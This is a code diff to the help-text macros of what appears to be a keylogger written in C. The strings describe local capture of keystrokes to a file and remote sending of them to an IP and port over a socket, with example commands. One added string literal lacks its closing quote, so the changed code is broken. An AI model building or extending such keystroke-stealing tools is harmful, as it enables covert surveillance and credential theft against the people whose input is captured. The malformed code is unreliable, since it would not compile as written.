@@ -27,13 +27,13 @@
 #define SHORT_OPTION_STORE_CHARACTER 'C'
 #define SHORT_OPTION_HELP 'h'
 
-#define HELP_MESSAGE "Keylogger options : "
-#define HELP_MESSAGE_REQUIERED "\t[REQUIERED] : Please, choose one of this option"
+#define HELP_MESSAGE "Keylogger : "
+#define HELP_MESSAGE_REQUIERED "\t[REQUIERED] Parameters
 #define HELP_MESSAGE_LOCAL "\t\t-l | --local : local keylogger, store data into file on this computer, require 1 argument (destination path)"
 #define HELP_MESSAGE_LOCAL_EXAMPLE "\t\t\tExample : ./bin/main.exe -l D:\\file.txt"
 #define HELP_MESSAGE_REMOTE "\t\t-r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)"
 #define HELP_MESSAGE_REMOTE_EXAMPLE "\t\t\tExample : ./bin/main.exe -r 192.168.1.16 7777"
-#define HELP_MESSAGE_OPTIONAL "\t[OPTIONAL]"
+#define HELP_MESSAGE_OPTIONAL "\t[OPTIONAL] Options"
 #define HELP_MESSAGE_NO_CLICK "\t\t-c | --no_click : don't store click keys (based on ascii)"
 #define HELP_MESSAGE_NO_CLICK_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -c"
 #define HELP_MESSAGE_ALPHABET_ONLY "\t\t-a | --alphabet_only : Store alphabet only, A-z (based on ascii)"
